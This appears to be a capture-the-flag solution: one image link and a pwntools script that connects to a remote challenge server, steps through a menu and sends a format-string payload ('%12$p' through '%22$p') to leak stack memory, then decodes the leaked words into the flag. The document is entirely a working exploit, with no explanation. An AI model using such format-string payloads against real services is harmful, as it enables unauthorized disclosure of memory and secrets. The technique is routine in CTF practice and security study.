![image](https://github.com/gookoosss/CTF/assets/128712571/bd25dcb4-03bf-4e61-b045-b073461dd114)


```python
from pwn import *

p = remote('159.65.24.125', 31710)

p.sendlineafter(b'Name: ', b'b')
p.sendlineafter(b'Nickname: ', b'b')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'%12$p|%13$p|%14$p|%15$p|%16$p|%17$p|%18$p|%19$p|%20$p|%21$p|%22$p')

flag = ''
p.recvuntil(b'this: \x1B[0m\n')
flag += str(p32(int(p.recv(10), 16)).decode())
for i in range(10):
    p.recvuntil(b'|')
    flag += str(p32(int(p.recv(10), 16)).decode())

print(flag)

p.interactive()
```
